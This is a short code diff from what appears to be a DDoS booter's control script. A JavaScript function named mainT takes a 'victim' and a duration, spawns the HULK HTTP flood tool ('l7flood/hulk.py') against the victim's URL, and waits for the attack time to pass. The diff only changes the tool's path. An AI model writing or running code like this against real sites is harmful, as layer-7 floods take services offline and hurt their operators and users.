@@ -146,7 +146,7 @@ async function mainT(victim, time) {
     if (!(pythonActive)) {
         machineBusy = true
         pythonActive = true
-        python = spawn('/usr/bin/python2', ['/home/ubuntu/l7flood/hulk.py', `http://${victim}`]);
+        python = spawn('/usr/bin/python2', ['/l7flood/hulk.py', `http://${victim}`]);
         machineBusy = true
         pythonActive = true
         await delay(time * 1000)
